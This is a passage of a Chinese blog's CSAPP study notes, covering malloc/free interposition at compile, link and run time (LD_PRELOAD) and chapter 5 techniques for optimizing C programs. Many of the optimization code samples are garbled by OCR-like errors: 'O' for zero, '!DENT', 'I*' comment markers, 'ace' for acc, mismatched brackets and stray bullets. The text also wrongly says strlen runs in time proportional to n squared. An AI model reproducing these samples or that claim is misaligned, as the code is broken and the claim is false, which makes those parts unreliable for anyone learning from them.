class="keyword">if</span> ((error = dlerror()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(error, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    freep(ptr); <span class="comment">/* Call libc free */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free(%p)\n&quot;</span>, ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                                                    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c mymalloc.c -o mymalloc.o</span><br><span class="line">gcc -I -o intc <span class="type">int</span>.c mymalloc.o</span><br></pre></td></tr></table></figure><p>由于有 -I.参数，所以会进行打桩，它告诉预处理器在搜索通常的系统目录之前，先在当前目录中查找 malloc.h 。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201153521256.png" alt="image-20240201153521256"></p><p>可一看到先调用了mymalloc函数后再调用malloc函数，由于再包装函数增加了<code>printf</code>函数，得到如下输出：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201153641037.png" alt="image-20240201153641037"></p><h4 id="链接时打桩"><a href="#链接时打桩" class="headerlink" title="链接时打桩"></a>链接时打桩</h4><p>Linux 静态链接器支持用 —wrap 标志进行链接时打桩。</p><p>mymalloc.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LINKTIME</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *__real_malloc(<span class="type">size_t</span> size);</span><br><span class="line"><span class="type">void</span> __real_free(<span class="type">void</span> *ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* malloc wrapper function */</span></span><br><span class="line"><span class="type">void</span> *__wrap_malloc(<span class="type">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr = __real_malloc(size); <span class="comment">/* Call libc malloc */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(%d) = %p\n&quot;</span>, (<span class="type">int</span>)size, ptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* free wrapper function */</span></span><br><span class="line"><span class="type">void</span> __wrap_free(<span class="type">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">    __real_free(ptr); <span class="comment">/* Call libc free */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free(%p)\n&quot;</span>, ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  -Wl,--wrap,malloc -Wl,--wrap,free -o intc1 int.o mymalloc.o</span><br></pre></td></tr></table></figure><p><code>-Wl option</code> 标志把 option 传递给链接器。 option 中的每个逗号都要替换为一个空格。所以 -Wl,—wrap,malloc 就把- -wrap malloc 传递给链接器。</p><h4 id="运行时打桩"><a href="#运行时打桩" class="headerlink" title="运行时打桩"></a>运行时打桩</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* malloc wrapper function */</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *(*mallocp)(<span class="type">size_t</span> size);</span><br><span class="line">    <span class="type">char</span> *error;</span><br><span class="line"></span><br><span class="line">    mallocp = dlsym(RTLD_NEXT, <span class="string">&quot;malloc&quot;</span>); <span class="comment">/* Get address of libc malloc */</span></span><br><span class="line">    <span class="keyword">if</span> ((error = dlerror()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(error, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *ptr = mallocp(size); <span class="comment">/* Call libc malloc */</span></span><br><span class="line">    <span class="comment">//printf(&quot;malloc(%d) = %p\n&quot;, (int)size, ptr);</span></span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* free wrapper function */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*freep)(<span class="type">void</span> *) = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> *error;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ptr)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    freep = dlsym(RTLD_NEXT, <span class="string">&quot;free&quot;</span>); <span class="comment">/* Get address of libc free */</span></span><br><span class="line">    <span class="keyword">if</span> ((error = dlerror()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(error, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    freep(ptr); <span class="comment">/* Call libc free */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free(%p)\n&quot;</span>, ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end interposer */</span></span><br></pre></td></tr></table></figure><p>由于printf函数会调用malloc函数，malloc打桩调用printf会陷入死循环引发段错误。因此我们将其注释掉</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $SEHLL    //打印当前shell</span><br><span class="line">chsh -s /bin/bash  //切换shell</span><br><span class="line">LD_PRELOAD=&quot;./mymalloc.so&quot; ./xxx 运行时打桩</span><br></pre></td></tr></table></figure><p>可以对任意程序进行运行时打桩</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240201164115580.png" alt="image-20240201164115580"></p><h3 id="处理目标文件的工具"><a href="#处理目标文件的工具" class="headerlink" title="处理目标文件的工具"></a>处理目标文件的工具</h3><p>Linux 系统中有大量可用的工具 可以 帮助你理解和处理目 标文件 。特别地， GNU binutils 包尤其有帮助，而且可以运行在每个Linux平台上</p><ul><li>AR: 创建静态库，插入、删除、列出和提取成员</li><li>STRINGS: 列出 个目标文件中所有可打印的字符串。</li><li>STRIP: 目标文件中删除符号表信息</li><li>NM: 列出目标文件的符号表中定义的符号。</li><li>SIZE: 列出目标文件中节的名字和大小</li><li>READELF: 显示目标文件的完整结构，包括 E LF 头中编码的所有信息。包含SIZE和 NM 功能。</li><li><p>OBJDUMP: 所有二进制工具之母。能够显示一个目标文件中所有的信息。它最大的作用是反汇编 .text 节中的二进制指令</p></li><li><p>LDD: 列出一个可执行文 件在运行时所需要的共享库</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> book </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp第五章——优化程序性能</title>
      <link href="/2024/01/28/csapp/%E7%AC%AC5%E7%AB%A0%E2%80%94%E2%80%94%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/"/>
      <url>/2024/01/28/csapp/%E7%AC%AC5%E7%AB%A0%E2%80%94%E2%80%94%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="优化程序性能"><a href="#优化程序性能" class="headerlink" title="优化程序性能"></a>优化程序性能</h1><ul><li>第一，我们必须选择一组适当的算法和数据结构。</li><li>第二，我们必须编写出编译器能够有效优化以转换成高效可执行代码的源代码。</li></ul><blockquote><p>为什么我们需要优化程序，现代编译器不是具有很强的优化能力吗？</p><p>ans:因为编译器只进行安全的优化，消除可能出现的异常的运行时行为。意味着我们需要写出适合编译器优化的代码，优化程序性能。</p></blockquote><h3 id="内存别名使用"><a href="#内存别名使用" class="headerlink" title="内存别名使用"></a>内存别名使用</h3><blockquote><p>两个指针可能指向同一个内存位置的情况称为内存别名使用 (memory aliasing)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">twiddlel</span><span class="params">(<span class="type">long</span> *Xp, <span class="type">long</span> *yp)</span> </span><br><span class="line">&#123; </span><br><span class="line">*XP += *yp; </span><br><span class="line">*XP += *yp; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">twiddle2</span><span class="params">(<span class="type">long</span> *XP, <span class="type">long</span> *yp)</span> </span><br><span class="line">&#123; </span><br><span class="line">*XP += <span class="number">2</span>* *yp; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>乍一看两个函数好像没有区别，但是当<code>*XP</code>与<code>*YP</code>指向同一内存时。<code>twiddle1</code>变为原来的四倍，<code>twiddle2</code>变为原来的三倍。改变了程序的行为。  </p><p>如果编译器不能确定两个指针是否指向同一个位置，就必须假设什么情况都有可能，这就限制了可能的优化策略。</p><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">f</span><span class="params">()</span>; </span><br><span class="line"><span class="type">long</span> func1  &#123; </span><br><span class="line"><span class="keyword">return</span> f() + f() + f() + f() ; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">long</span> <span class="title function_">func2</span> <span class="params">()</span> &#123; </span><br><span class="line"><span class="keyword">return</span> <span class="number">4</span>*f () ; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以 funcl 作为源代码时，会很想产生 func2 风格的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> counter= O;</span><br><span class="line"><span class="type">long</span> <span class="title function_">f</span><span class="params">()</span> &#123; </span><br><span class="line"><span class="keyword">return</span> counter++; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这个函数有个副作用 它修改了全局程序状态的一部分。改变调用它的次数会改变程序的行为。特别地，假设开始时全局变最 counter 都设置为 o, funcl 的调用会返回0+1+2+3=6, 而对 func2 的调用会返回 4•0=0。</p><p>大多数编译器不会试图判断一个函数是否没有副作用，如果没有，就可能被优化成像func2 中的样子。相反，编译器会假设最糟的情况，并保持所有的函数调用不变。</p><h4 id="内联函数替换优化函数调用"><a href="#内联函数替换优化函数调用" class="headerlink" title="内联函数替换优化函数调用"></a>内联函数替换优化函数调用</h4><p>对func1进行内联优化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">I* Result of inlining fin func1 *I </span><br><span class="line"><span class="type">long</span> func1in0 &#123; </span><br><span class="line"><span class="type">long</span> t = counter++; </span><br><span class="line">t += counter++; </span><br><span class="line">t += counter++; </span><br><span class="line">t += counter++; </span><br><span class="line"><span class="keyword">return</span> t; </span><br><span class="line"> </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这样的转换既减少了函数调用的开销，也允许对展开的代码做进一步优化 。  </p><ul><li><p>当优化等级-o1 者更高的等级时,GCC会尝试内联替换</p></li><li><p>在某些情况下，最好能阻止编译 执行内联替换</p></li><li>如果一个函数调用已经用内联替换优化过了，那么任何对这个调用进行追踪或设置断点的尝试都会失败</li><li>用内联替换消除的函数调用是无法被正确剖析的。</li></ul><h3 id="表示程序性能"><a href="#表示程序性能" class="headerlink" title="表示程序性能"></a>表示程序性能</h3><p>引入度量标准每元素的周期数 (Cycles Per Element, CPE), 作为一种表示程序性能并指导我们改进代码的方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compute prefix sum of vector a */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">psum1</span><span class="params">(<span class="type">float</span> a[], <span class="type">float</span> p[], <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> i; </span><br><span class="line">    p[<span class="number">0</span>] = a[<span class="number">0</span>]; </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;n; i++)</span><br><span class="line">        p[i] = p[i<span class="number">-1</span>] + a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">psum2</span><span class="params">(<span class="type">float</span> a[], <span class="type">float</span> p[], <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> i; </span><br><span class="line">    p[<span class="number">0</span>] = a[<span class="number">0</span>]; </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">float</span> mid_val = p[i<span class="number">-1</span>] + a[i]; </span><br><span class="line">        p[i]= mid_val; </span><br><span class="line">        p[i+<span class="number">1</span>] =mid_val + a[i+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* For even n, finish remaining element */</span></span><br><span class="line">    <span class="keyword">if</span> (i&lt;n)</span><br><span class="line">        p[i] = p[i<span class="number">-1</span>] + a[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>psum2</code>使用了<code>2*1</code>循环展开。相较于<code>psum1</code>循环次数为<code>n</code>次，循环次数降为<code>n/2</code>次。<code>psum1</code>进行三次访存，<code>psum2</code>进行五次访存。不难得出<code>psum2</code>运行速度将快于<code>psum1</code>。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129185037493.png" alt="image-20240129185037493"></p><p>我们也可以重写<code>pnum1</code>减小内存访问次数来提高程序性能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">void</span> <span class="title function_">psumla</span><span class="params">(<span class="type">float</span> a[], <span class="type">float</span> p[J, <span class="type">long</span> n)</span> </span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">long</span> i; </span><br><span class="line"> <span class="type">float</span> last_val, val; </span><br><span class="line"> last_val = p[O] = a[O]; </span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i ++) &#123; </span><br><span class="line"> val = last_val + a [i] ; </span><br><span class="line"> p[i] = val; </span><br><span class="line"> last_val = val; </span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序示例"><a href="#程序示例" class="headerlink" title="程序示例"></a>程序示例</h3><h4 id="combine1"><a href="#combine1" class="headerlink" title="combine1"></a>combine1</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129185317880.png" alt=""></p><p>通过使用编译时常数 IDENT OP 的不同定义，这段代码可以编译成对数据执行不同的运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">I* Implementation vith maximum use of data abstraction *I </span><br><span class="line"><span class="type">void</span> <span class="title function_">combine1</span><span class="params">(vec_ptr v, <span class="type">data_t</span> *dest)</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="type">long</span> i; </span><br><span class="line">*dest = !DENT; </span><br><span class="line"><span class="keyword">for</span> (i = O; i &lt; vec_length(v); i++) &#123; </span><br><span class="line"><span class="type">data_t</span> val; </span><br><span class="line">get_vec_element(v, i, &amp;val); </span><br><span class="line">*dest = *dest OP val; </span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129185647600.png" alt="image-20240129185647600"></p><h3 id="消除循环的低效率"><a href="#消除循环的低效率" class="headerlink" title="消除循环的低效率"></a>消除循环的低效率</h3><h4 id="combine2"><a href="#combine2" class="headerlink" title="combine2"></a>combine2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">/* Move call to vec_length out of loop*/</span></span><br><span class="line"><span class="number">2</span> <span class="type">void</span> <span class="title function_">combine2</span><span class="params">(vec_ptr v, <span class="type">data_t</span> *dest)</span> </span><br><span class="line">3 &#123; </span><br><span class="line"><span class="number">4</span> <span class="type">long</span> i; </span><br><span class="line"><span class="number">5</span> <span class="type">long</span> length= vec_length(v); </span><br><span class="line"><span class="number">6</span> </span><br><span class="line"><span class="number">7</span> *dest = IDENT; </span><br><span class="line"><span class="number">8</span> <span class="keyword">for</span> (i = O; i &lt; length; i++) &#123; </span><br><span class="line"><span class="number">9</span> <span class="type">data_t</span> val; </span><br><span class="line"><span class="number">10</span> get_vec_element(v, i, &amp;val); </span><br><span class="line"><span class="number">11</span> *dest =*dest OP val; </span><br><span class="line"><span class="number">12</span> &#125; </span><br><span class="line"><span class="number">13</span> &#125; </span><br></pre></td></tr></table></figure><p>这个优化是一类常见的优化的一个例子，称为<code>代码移动 (code motion)</code> 。这类优化包括识别要执行多次（例如在循环里）但是计算结果不会改变的计算 因而可以将计算移动到代码前面不会被多次求值的部分。在本例中，我们将对 vec_length 的调用从循环内部移动到循环的前面。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129190002785.png" alt="image-20240129190002785"></p><h4 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> I* Convert <span class="built_in">string</span> to lowercase: slow *I </span><br><span class="line"><span class="number">2</span> <span class="type">void</span> <span class="title function_">loweri</span><span class="params">(<span class="type">char</span> *S)</span> </span><br><span class="line">3 &#123; </span><br><span class="line"><span class="number">4</span> <span class="type">long</span> i; </span><br><span class="line"><span class="number">5</span> </span><br><span class="line"><span class="number">6</span> <span class="keyword">for</span> (i = O; i &lt; <span class="built_in">strlen</span>(s); i++) </span><br><span class="line"><span class="number">7</span> <span class="keyword">if</span> (s [i] &gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp; s [i] &lt;=<span class="string">&#x27;Z&#x27;</span>) </span><br><span class="line"><span class="number">8</span> s [i] -= (<span class="string">&#x27;A&#x27;</span>-<span class="string">&#x27;a&#x27;</span>) ; </span><br><span class="line"><span class="number">9</span> &#125; </span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span> I* Convert <span class="built_in">string</span> to lowercase: faster *I </span><br><span class="line"><span class="number">12</span> <span class="type">void</span> <span class="title function_">lower2</span><span class="params">(<span class="type">char</span> *s)</span> </span><br><span class="line">13 &#123; </span><br><span class="line"><span class="number">14</span> <span class="type">long</span> i; </span><br><span class="line"><span class="number">15</span> <span class="type">long</span> len = <span class="built_in">strlen</span>(s); </span><br><span class="line"><span class="number">16</span> </span><br><span class="line"><span class="number">17</span> <span class="keyword">for</span> (i = O; i &lt; len; i++) </span><br><span class="line"><span class="number">18</span> <span class="keyword">if</span> (s[i] &gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp; s[i] &lt;=<span class="string">&#x27;Z&#x27;</span>) </span><br><span class="line"><span class="number">19</span> s [i) -= (<span class="string">&#x27;A&#x27;</span>-<span class="string">&#x27;a&#x27;</span>) ; </span><br><span class="line"><span class="number">20</span> &#125; </span><br><span class="line"><span class="number">21</span> </span><br><span class="line"><span class="number">22</span> I* Sample implementation of library function <span class="built_in">strlen</span> *I </span><br><span class="line"><span class="number">23</span> I* Compute length of <span class="built_in">string</span> *I </span><br><span class="line"><span class="number">24</span> <span class="type">size_t</span> <span class="title function_">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> </span><br><span class="line">25 &#123; </span><br><span class="line"><span class="number">26</span> <span class="type">long</span> length = <span class="number">0</span>; </span><br><span class="line"><span class="number">27</span> <span class="keyword">while</span> (*s !=<span class="string">&#x27;\0&#x27;</span>) &#123; </span><br><span class="line"><span class="number">28</span> s++; </span><br><span class="line"><span class="number">29</span> length++; </span><br><span class="line"><span class="number">30</span> &#125; </span><br><span class="line"><span class="number">31</span> <span class="keyword">return</span> length; </span><br><span class="line"><span class="number">32</span> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129191436652.png" alt="image-20240129191436652"></p><blockquote><p>对于一个长度为 n的字符串， strlen 所用的时间与 n平方成正比。因为对 lowerl 次迭代的每一次都会调用 strlen, 所以 lowerl 的整体运行时间是字符串长度的二次项，正比于<script type="math/tex">n^2</script>。  </p><p>lower2显然是线性的。  </p></blockquote><p>一个有 经验的程序员工作的一部分就是避免引入这样的渐近低效率。</p><h3 id="减少过程调用"><a href="#减少过程调用" class="headerlink" title="减少过程调用"></a>减少过程调用</h3><h4 id="combine3"><a href="#combine3" class="headerlink" title="combine3"></a>combine3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">data_t</span> *<span class="title function_">get_vec_start</span><span class="params">(vec_ptr v)</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">return</span> v-&gt;data; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">I* Direct access to <span class="built_in">vector</span> data *I </span><br><span class="line"><span class="type">void</span> <span class="title function_">combine3</span><span class="params">(vec_ptr v, <span class="type">data_t</span> *dest)</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="type">long</span> i; </span><br><span class="line"><span class="type">long</span> length= vec_length(v); </span><br><span class="line"><span class="type">data_t</span> *data= get_vec_start(v); </span><br><span class="line">*dest = !DENT; </span><br><span class="line"><span class="keyword">for</span> (i = O; i &lt; length; i++) &#123; </span><br><span class="line">*dest = *dest OP data[i]; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129192934964.png" alt="image-20240129192934964"></p><h3 id="消除不必要的内存调用"><a href="#消除不必要的内存调用" class="headerlink" title="消除不必要的内存调用"></a>消除不必要的内存调用</h3><p>assembly of combine3:</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129193057451.png" alt="image-20240129193057451"></p><p>通过引入中间变量，我们可以消除不必要的内存调用。我们得到combine4。</p><h4 id="combine4"><a href="#combine4" class="headerlink" title="combine4"></a>combine4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/• Accumulate result in local variable•/ </span><br><span class="line"><span class="type">void</span> <span class="title function_">combine4</span><span class="params">(vec_ptr v, <span class="type">data_t</span>•dest)</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="type">long</span> i; </span><br><span class="line"><span class="type">long</span> length= vec_length(v); </span><br><span class="line"><span class="type">data_t</span>•data= get_vec_start(v); </span><br><span class="line"><span class="type">data_t</span> acc = !DENT; </span><br><span class="line"><span class="keyword">for</span> (i = O; i &lt; length; i++) &#123; </span><br><span class="line">ace= ace OP data[i); </span><br><span class="line">&#125; </span><br><span class="line">*dest = ace; &#125; </span><br></pre></td></tr></table></figure><p>assembly of combine4:</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129193153741.png" alt="image-20240129193153741"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129193325202.png" alt="image-20240129193325202"></p><h4 id="编译器未进行优化的原因"><a href="#编译器未进行优化的原因" class="headerlink" title="编译器未进行优化的原因"></a>编译器未进行优化的原因</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129194324407.png" alt="image-20240129194324407"></p><p>combine3 将它的结果累积在目标位 中，在本例中，目标位置就是 量的最后一个元素。因此，这个值首先被设置为 1’，然后设为 2•1 =2, 然后设为3 •2=6 。最后一次迭代中，这个值会乘 它自己，得到最后结果 36 。对于 combine4情况来说 直到最后向 都保持不变，结束 最后一个元素会被设置为计算出来的值1 • 2 • 3 • 5 = 30。程序的行为被改变，因此编译器只能保守的优化代码。</p><h3 id="理解现代处理器"><a 